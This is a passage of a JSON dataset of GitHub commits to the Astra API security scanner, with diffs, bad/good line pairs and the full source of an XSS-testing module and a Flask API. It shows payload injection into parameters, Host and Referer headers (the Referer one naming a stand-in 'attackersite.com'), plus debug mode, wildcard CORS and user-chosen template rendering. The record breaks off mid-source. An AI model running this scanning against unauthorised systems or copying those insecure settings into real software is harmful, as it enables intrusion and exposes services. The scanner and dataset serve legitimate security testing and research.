11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n-                    dbupdate.insert_record(attack_result)\n-                    result = True\n-\n-            xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n-            if xss_request_url.text.find(payload) != -1:\n-                impact = check_xss_impact()\n-                print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n+        if result is not True:\n+            decoded_payload = xss_payload_decode(payload)\n+            if xss_request_url.text.find(decoded_payload) != -1:\n+                impact = check_xss_impact(xss_request_url.headers)\n                 attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                 dbupdate.insert_record(attack_result)\n+                result = True\n+\n+        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n+        if xss_request_url.text.find(decoded_payload) != -1:\n+            impact = check_xss_impact(xss_request_uri.headers)\n+            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n+            dbupdate.insert_record(attack_result)\n                 \n \n def xss_get_uri(url,method,headers,body,scanid=None):\n@@ -126,7 +168,10 @@ def xss_get_uri(url,method,headers,body,scanid=None):\n                         parsed_url = urlparse.urlparse(url)\n                         xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                         xss_request = req.api_request(xss_url,\"GET\",headers)\n-                        if xss_request.text.find(payload) != -1:\n+                        decoded_payload = xss_payload_decode(payload)\n+                        print decoded_payload\n+                        print xss_url\n+                        if xss_request.text.find(decoded_payload) != -1:\n                             impact = check_xss_impact(xss_request.headers)\n                             logs.logging.info(\"%s is vulnerable to XSS\",url)\n                             print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n@@ -147,7 +192,8 @@ def xss_get_uri(url,method,headers,body,scanid=None):\n \n         if vul_param:\n             # Update all vulnerable params to db.\n-            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" are vulnerable to XSS\"}})\n+            print vul_param,scanid\n+            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n \n \n def xss_check(url,method,headers,body,scanid):\n@@ -155,5 +201,8 @@ def xss_check(url,method,headers,body,scanid):\n     if method == 'GET' or method == 'DEL':\n         xss_get_uri(url,method,headers,body,scanid)\n         xss_get_url(url,method,headers,body,scanid)\n-    \n+\n+    if method == 'POST' or method == 'PUT':\n+        xss_post_method(url,method,headers,body,scanid)\n+\n     xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n", "message": "", "files": {"/API/api.py": {"changes": [{"diff": "\n from flask import Response,make_response\n from flask import request\n from flask import Flask\n-from apiscan import scan_single_api\n+from astra import scan_single_api\n from flask import jsonify\n from pymongo import MongoClient\n from utils.vulnerabilities import alerts", "add": 1, "remove": 1, "filename": "/API/api.py", "badparts": ["from apiscan import scan_single_api"], "goodparts": ["from astra import scan_single_api"]}], "source": "\nimport ast import json import sys import hashlib import time sys.path.append('../') from flask import Flask,render_template from flask import Response,make_response from flask import request from flask import Flask from apiscan import scan_single_api from flask import jsonify from pymongo import MongoClient from utils.vulnerabilities import alerts app=Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static') client=MongoClient('localhost',27017) global db db=client.apiscan def generate_hash(): scanid=hashlib.md5(str(time.time())).hexdigest() return scanid @app.route('/scan/', methods=['POST']) def start_scan(): scanid=generate_hash() content=request.get_json() try: name=content['appname'] url=content['url'] headers=content['headers'] body=content['body'] method=content['method'] api=\"Y\" scan_status=scan_single_api(url, method, headers, body, api, scanid) if scan_status is True: msg={\"status\": scanid} try: db.scanids.insert({\"scanid\": scanid, \"name\": name, \"url\": url}) except: print \"Failed to update DB\" else: msg={\"status\": \"Failed\"} except: msg={\"status\": \"Failed\"} return jsonify(msg) @app.route('/scan/scanids/', methods=['GET']) def fetch_scanids(): scanids=[] records=db.scanids.find({}) if records: for data in records: data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) if data['scanid']: if data['scanid'] not in scanids: scanids.append({\"scanid\": data['scanid'], \"name\": data['name'], \"url\": data['url']}) except: pass return jsonify(scanids) def fetch_records(scanid): vul_list=[] records=db.vulnerabilities.find({\"scanid\":scanid}) print \"Records are \",records if records: for data in records: print \"Data is\",data if data['req_body']==None: data['req_body']=\"NA\" data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) except: print \"Falied to parse\" print \"Data\",data try: if data['id']==\"NA\": all_data={'url': data['url'], 'impact': data['impact'], 'name': data['name'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': data['Description'], 'remediation': data['remediation']} vul_list.append(all_data) if data['id']: for vul in alerts: if data['id']==vul['id']: all_data={ 'url': data['url'], 'impact': data['impact'], 'name': data['alert'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': vul['Description'], 'remediation': vul['remediation'] } vul_list.append(all_data) break except: pass print vul_list return vul_list @app.route('/alerts/<scanid>', methods=['GET']) def return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults={'page': 'scan.html'}) @app.route('/<page>') def view_dashboard(page): return render_template('{}'.format(page)) app.run(host='0.0.0.0', port=8094,debug=True) ", "sourceWithComments": "import ast\nimport json\nimport sys\nimport hashlib\nimport time\n\nsys.path.append('../')\n\nfrom flask import Flask,render_template\nfrom flask import Response,make_response\nfrom flask import request\nfrom flask import Flask\nfrom apiscan import scan_single_api\nfrom flask import jsonify\nfrom pymongo import MongoClient\nfrom utils.vulnerabilities import alerts\n \napp = Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static')\n \n# Mongo DB connection \nclient = MongoClient('localhost',27017)\nglobal db\ndb = client.apiscan\n\n\n############################# Start scan API ######################################\ndef generate_hash():\n    # Return md5 hash value of current timestmap \n    scanid = hashlib.md5(str(time.time())).hexdigest()\n    return scanid\n\n# Start the scan and returns the message\n@app.route('/scan/', methods = ['POST'])\ndef start_scan():\n    scanid = generate_hash()\n    content = request.get_json()\n    try:\n        name = content['appname']\n        url = content['url']\n        headers = content['headers']\n        body = content['body']\n        method = content['method']\n        api = \"Y\"\n        scan_status = scan_single_api(url, method, headers, body, api, scanid)\n        if scan_status is True:\n            # Success\n            msg = {\"status\" : scanid}\n            try:\n                db.scanids.insert({\"scanid\" : scanid, \"name\" : name, \"url\" : url})\n            except:\n                print \"Failed to update DB\"\n        else:\n            msg = {\"status\" : \"Failed\"}\n    \n    except:\n        msg = {\"status\" : \"Failed\"} \n    \n    return jsonify(msg)\n\n\n#############################  Fetch ScanID API #########################################\n@app.route('/scan/scanids/', methods=['GET'])\ndef fetch_scanids():\n    scanids = []\n    records = db.scanids.find({})\n    if records:\n        for data in records:\n            data.pop('_id')\n            try:\n                data =  ast.literal_eval(json.dumps(data))\n                if data['scanid']:\n                    if data['scanid'] not in scanids:\n                        scanids.append({\"scanid\" : data['scanid'], \"name\" : data['name'], \"url\" : data['url']}) \n            except:\n                pass\n\n        return jsonify(scanids)\n############################# Alerts API ##########################################\n\n# Returns vulnerbilities identified by tool \ndef fetch_records(scanid):\n    # Return alerts identified by the tool\n    vul_list = []\n    records = db.vulnerabilities.find({\"scanid\":scanid})\n    print \"Records are \",records\n    if records:\n        for data in records:  \n            print \"Data is\",data\n            if data['req_body'] == None:\n                data['req_body'] = \"NA\" \n\n            data.pop('_id')\n            try:\n                data =  ast.literal_eval(json.dumps(data))\n            except:\n                print \"Falied to parse\"\n\n            print \"Data\",data\n            try:\n                if data['id'] == \"NA\":\n                    all_data = {'url' : data['url'], 'impact' : data['impact'], 'name' : data['name'], 'req_headers' : data['req_headers'], 'req_body' : data['req_body'], 'res_headers' : data['res_headers'], 'res_body' : data['res_body'], 'Description' : data['Description'], 'remediation' : data['remediation']}\n                    vul_list.append(all_data)\n\n                if data['id']:\n                    for vul in alerts:\n                        if data['id'] == vul['id']:\n                            all_data = {\n                                        'url' : data['url'],\n                                        'impact' : data['impact'],\n                                        'name' : data['alert'],\n                                        'req_headers' : data['req_headers'],\n                                        'req_body' : data['req_body'],\n                                        'res_headers' : data['res_headers'],\n                                        'res_body' : data['res_body'],\n                                        'Description' : vul['Description'],\n                                        'remediation' : vul['remediation']\n                                        }\n                            vul_list.append(all_data)\n                            break\n\n            except:\n                pass\n\n        print vul_list\n        return vul_list\n        \n\n@app.route('/alerts/<scanid>', methods=['GET'])\ndef return_alerts(scanid):\n    print \"ScanID is \",scanid\n    result = fetch_records(scanid)\n    resp = jsonify(result)\n    resp.headers[\"Access-Control-Allow-Origin\"] = \"*\"\n    return resp\n\n#############################Dashboard#########################################\n\n@app.route('/', defaults={'page': 'scan.html'})\n@app.route('/<page>')\ndef view_dashboard(page):\n    return render_template('{}'.format(page))\n\napp.run(host='0.0.0.0', port= 8094,debug=True)\n"}}, "msg": "XSS module changes"}, "27377aa23bcd9153453a2ee04c3dc33120c3b093": {"url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/27377aa23bcd9153453a2ee04c3dc33120c3b093", "html_url": "https://github.com/flipkart-incubator/Astra/commit/27377aa23bcd9153453a2ee04c3dc33120c3b093", "sha": "27377aa23bcd9153453a2ee04c3dc33120c3b093", "keyword": "XSS change", "diff": "diff --git a/modules/xss.py b/modules/xss.py\nindex 6b3c332..0ca843a 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -62,7 +62,7 @@ def xss_post_method(url,method,headers,body,scanid=None):\n             xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n             decoded_payload = xss_payload_decode(payload)\n             if xss_post_request.text.find(decoded_payload) != -1:\n-                impact = check_xss_impact(xss_post.body)\n+                impact = check_xss_impact(xss_post_request.headers)\n                 if db_update is not True:\n                     attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                     dbupdate.insert_record(attack_result)\n", "message": "", "files": {"/modules/xss.py": {"changes": [{"diff": "\n             xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n             decoded_payload = xss_payload_decode(payload)\n             if xss_post_request.text.find(decoded_payload) != -1:\n-                impact = check_xss_impact(xss_post.body)\n+                impact = check_xss_impact(xss_post_request.headers)\n                 if db_update is not True:\n                     attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                     dbupdate.insert_record(attack_result)\n", "add": 1, "remove": 1, "filename": "/modules/xss.py", "badparts": ["                impact = check_xss_impact(xss_post.body)"], "goodparts": ["                impact = check_xss_impact(xss_post_request.headers)"]}], "source": "\nimport os import urlparse import sendrequest as req import utils.logs as logs import urlparse import time import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii','ignore') return decoded_payload def xss_post_method(url,method,headers,body,scanid=None): print url, headers,method,body temp_body={} post_vul_param='' for key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post.body) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers(url,method,headers,body,scanid) ", "sourceWithComments": "import os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\nimport urllib\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    print \"response header\",res_headers['Content-Type']\n    if res_headers['Content-Type']:\n        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_payload_decode(payload):\n    # Return decoded payload of XSS. \n    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n    return decoded_payload\n\ndef xss_post_method(url,method,headers,body,scanid=None):\n    # This function checks XSS through POST method.\n    print url, headers,method,body\n    temp_body = {}\n    post_vul_param = ''\n    for key,value in body.items():\n        xss_payloads = fetch_xss_payload()\n        for payload in xss_payloads:\n            temp_body.update(body)\n            temp_body[key] = payload\n            print \"updated body\",temp_body\n            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n            decoded_payload = xss_payload_decode(payload)\n            if xss_post_request.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_post.body)\n                if db_update is not True:\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                    dbupdate.insert_record(attack_result)\n                    db_update = True\n                    vul_param += key\n                else:\n                    result = True\n                    if vul_param == '':\n                        post_vul_param += key\n                    else:\n                        post_vul_param += ','+key \n\n    if post_vul_param:\n        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        decoded_payload = xss_payload_decode(payload)\n        if host_header_xss.text.find(decoded_payload) != -1:\n            impact = \"Low\"\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'http://attackersite.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        decoded_payload = xss_payload_decode(payload)\n        if ref_header_xss.text.find(decoded_payload) != -1:\n            print ref_header_xss.text\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            return\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n        if result is not True:\n            decoded_payload = xss_payload_decode(payload)\n            if xss_request_url.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                result = True\n\n        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n        if xss_request_url.text.find(decoded_payload) != -1:\n            impact = check_xss_impact(xss_request_uri.headers)\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n            dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        decoded_payload = xss_payload_decode(payload)\n                        print decoded_payload\n                        print xss_url\n                        if xss_request.text.find(decoded_payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            print vul_param,scanid\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n\n    if method == 'POST' or method == 'PUT':\n        xss_post_method(url,method,headers,body,scanid)\n\n    xss_http_headers(url,method,headers,body,scanid)"}}, "msg": "Minor changes in xss_post_method function"}, "adf60251870f581f368cfd5a6d5e0337e9ba4c76": {"url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/adf60251870f581f368cfd5a6d5e0337e9ba4c76", "html_url": "https://github.com/flipkart-incubator/Astra/commit/adf60251870f581f368cfd5a6d5e0337e9ba4c76", "sha": "adf60251870f581f368cfd5a6d5e0337e9ba4c76", "keyword": "XSS change", "diff": "diff --git a/modules/xss.py b/modules/xss.py\nindex 6b3c332..0ca843a 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -62,7 +62,7 @@ def xss_post_method(url,method,headers,body,scanid=None):\n             xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n             decoded_payload = xss_payload_decode(payload)\n             if xss_post_request.text.find(decoded_payload) != -1:\n-                impact = check_xss_impact(xss_post.body)\n+                impact = check_xss_impact(xss_post_request.headers)\n                 if db_update is not True:\n                     attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                     dbupdate.insert_record(attack_result)\n", "message": "", "files": {"/modules/xss.py": {"changes": [{"diff": "\n             xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n             decoded_payload = xss_payload_decode(payload)\n             if xss_post_request.text.find(decoded_payload) != -1:\n-                impact = check_xss_impact(xss_post.body)\n+                impact = check_xss_impact(xss_post_request.headers)\n                 if db_update is not True:\n                     attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                     dbupdate.insert_record(attack_result)\n", "add": 1, "remove": 1, "filename": "/modules/xss.py", "badparts": ["                impact = check_xss_impact(xss_post.body)"], "goodparts": ["                impact = check_xss_impact(xss_post_request.headers)"]}], "source": "\nimport os import urlparse import sendrequest as req import utils.logs as logs import urlparse import time import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii','ignore') return decoded_payload def xss_post_method(url,method,headers,body,scanid=None): print url, headers,method,body temp_body={} post_vul_param='' for key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post.body) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain 